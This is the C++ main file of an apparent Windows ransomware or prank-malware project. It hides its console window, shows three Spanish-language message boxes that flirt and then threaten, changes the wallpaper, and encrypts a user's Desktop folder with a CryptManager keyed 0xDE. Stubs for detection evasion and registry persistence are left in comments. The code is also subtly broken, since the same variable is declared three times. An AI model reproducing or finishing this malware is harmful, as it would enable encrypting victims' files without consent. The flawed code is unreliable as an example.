// Loc.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#define TEST_MODE 0
#include "Utils.h"
#include "crypt/CryptManager.h"

#if TEST_MODE == 1
#include "tests/test.h"
#endif

void messages();

int main(void) {
    #if TEST_MODE == 1 
        start_testing();
        exit(0);
    #endif

	ShowWindow(GetConsoleWindow(), SW_HIDE);
    messages();

    Utils utils;
	utils.changeWallpaper();

    CryptManager cryptManager(0xDE);
    cryptManager.start(L"C:\\Users\\cain\\Desktop");
    /*
    Evasion evasion;
    if (evasion.mustBeAvoided == 1) {
        return 0xdeadbeef;
    }
    */

    // Persistence persistence;
    //Persistence::RegistryKeyCreation();  
    
    /*
    Utils utils;
    utils.changeWallpaper();
    */

    /*
    Crypt crypt;
    crypt.StartCrypt();

    */
    return EXIT_SUCCESS;
}

void messages()
{
    bool bOption = false;

    int response = MessageBoxW(NULL, L"Preciosaa 🥰. Quieres ser mi novia ? 🥵🥵🥵❤️", L"ESPERAAA!!!!", MB_YESNO | MB_ICONASTERISK);
    int response = MessageBoxW(NULL, L"...Seguro?😡", L"Advertencia", MB_YESNO | MB_ICONEXCLAMATION);
    int response = MessageBoxW(NULL, L"Ultima oportunidad ☠️☠️☠️☠️", L"PELIGRO", MB_YESNO | MB_ICONEXCLAMATION);
}

